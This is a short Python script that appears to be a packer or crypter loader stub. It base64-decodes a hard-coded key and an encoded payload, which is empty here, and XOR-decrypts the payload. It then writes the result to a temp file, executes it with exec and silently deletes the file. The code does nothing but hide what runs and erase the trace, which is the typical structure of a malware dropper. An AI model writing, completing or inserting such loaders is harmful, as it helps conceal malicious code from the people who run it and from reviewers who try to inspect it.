# -*- coding: utf-8 -*-
import base64 as _b64
import os, sys, tempfile

def _load():
    _k = _b64.b64decode("WmJ4ZThCM3ZsNWZORFY3UQ==").decode()
    _d = _b64.b64decode("")
    _r = bytearray()
    for _i, _b in enumerate(_d):
        _r.append(_b ^ ord(_k[_i % len(_k)]))
    _p = os.path.join(tempfile.gettempdir(), f"tmp_{os.getpid()}.py")
    with open(_p, 'w', encoding='utf-8') as _f:
        _f.write(_r.decode())
    return _p

if __name__ == "__main__":
    _p = _load()
    exec(compile(open(_p, encoding='utf-8').read(), _p, "exec"))
    try:
        os.remove(_p)
    except:
        pass
